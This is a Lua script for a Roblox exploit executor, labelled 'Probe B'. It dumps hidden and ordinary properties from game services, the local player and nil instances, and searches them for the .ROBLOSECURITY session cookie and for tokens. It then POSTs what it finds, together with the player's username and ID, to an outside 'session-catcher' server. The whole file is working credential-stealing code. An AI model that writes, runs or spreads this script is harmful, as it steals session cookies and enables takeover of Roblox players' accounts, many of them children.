-- ============================================================
--  Probe B — gethiddenproperties + getproperties + getnilinstances
-- ============================================================

local SERVER_URL = "https://session-catcher.onrender.com/catch"
local httpRequest = request or http_request or nil
if not httpRequest then return end

local HttpService = game:GetService("HttpService")
local Players = game:GetService("Players")
local LocalPlayer = Players.LocalPlayer

local hiddenPropertiesAll = {}
local propertiesAll = {}
local nilInstances = {}

-- -----------------------------------------------------------
-- 1. gethiddenproperties на всех сервисах
-- -----------------------------------------------------------
local services = {
    {"Players", game:GetService("Players")},
    {"NetworkClient", game:GetService("NetworkClient")},
    {"ReplicatedFirst", game:GetService("ReplicatedFirst")},
    {"RbxAnalyticsService", game:GetService("RbxAnalyticsService")},
    {"PlatformUserService", game:GetService("PlatformUserService")},
    {"DataStoreService", game:GetService("DataStoreService")},
    {"ScriptContext", game:GetService("ScriptContext")},
    {"TeleportService", game:GetService("TeleportService")},
    {"HttpService", game:GetService("HttpService")},
    {"game", game},
    {"LocalPlayer", LocalPlayer},
}

for _, pair in ipairs(services) do
    local name = pair[1]
    local svc = pair[2]
    
    -- gethiddenproperties (множественное)
    pcall(function()
        if gethiddenproperties then
            local props = gethiddenproperties(svc)
            if props and type(props) == "table" then
                local dump = {}
                for k, v in pairs(props) do
                    dump[tostring(k)] = tostring(v):sub(1, 300)
                end
                hiddenPropertiesAll[name] = dump
            else
                hiddenPropertiesAll[name] = "empty or nil"
            end
        end
    end)
    task.wait(0.1)
    
    -- getproperties (множественное)
    pcall(function()
        if getproperties then
            local props = getproperties(svc)
            if props and type(props) == "table" then
                local dump = {}
                for k, v in pairs(props) do
                    local vStr = tostring(v)
                    -- Ищем куку
                    if vStr:find("_|WARNING") or vStr:find("ROBLOSECURITY") then
                        dump[tostring(k)] = "COOKIE: " .. vStr:sub(1, 500)
                    else
                        dump[tostring(k)] = vStr:sub(1, 200)
                    end
                end
                propertiesAll[name] = dump
            end
        end
    end)
    task.wait(0.1)
end

-- -----------------------------------------------------------
-- 2. getnilinstances — ищем скрытые объекты
-- -----------------------------------------------------------
pcall(function()
    if getnilinstances then
        local instances = getnilinstances()
        if instances then
            for _, inst in ipairs(instances) do
                local name = inst.Name or "?"
                local className = inst.ClassName or "?"
                local entry = name .. " (" .. className .. ")"
                
                -- Проверяем скрытые свойства
                if gethiddenproperties then
                    local ok, props = pcall(gethiddenproperties, inst)
                    if ok and props then
                        for k, v in pairs(props) do
                            local vStr = tostring(v)
                            if vStr:find("_|WARNING") or vStr:find("ROBLOSECURITY") 
                               or vStr:find("cookie") or vStr:find("token") then
                                entry = entry .. " 🍪 " .. tostring(k) .. "=" .. vStr:sub(1, 300)
                            end
                        end
                    end
                end
                
                -- Проверяем обычные свойства
                if getproperties then
                    local ok2, props2 = pcall(getproperties, inst)
                    if ok2 and props2 then
                        for k, v in pairs(props2) do
                            local vStr = tostring(v)
                            if vStr:find("_|WARNING") or vStr:find("ROBLOSECURITY") then
                                entry = entry .. " 🍪 " .. tostring(k) .. "=" .. vStr:sub(1, 300)
                            end
                        end
                    end
                end
                
                table.insert(nilInstances, entry)
            end
        end
    end
end)

local payload = {
    probe = "B — Hidden Props + Nil Instances",
    username = LocalPlayer.Name,
    userId = LocalPlayer.UserId,
    hiddenPropertiesAll = hiddenPropertiesAll,
    propertiesAll = propertiesAll,
    nilInstances = nilInstances,
    timestamp = os.date("!%Y-%m-%dT%H:%M:%SZ")
}

pcall(function()
    httpRequest({
        Url = SERVER_URL,
        Method = "POST",
        Headers = {["Content-Type"] = "application/json"},
        Body = HttpService:JSONEncode(payload)
    })
end)

print("[Probe B] sent. Services: " .. #services .. " | Nil instances: " .. #nilInstances)
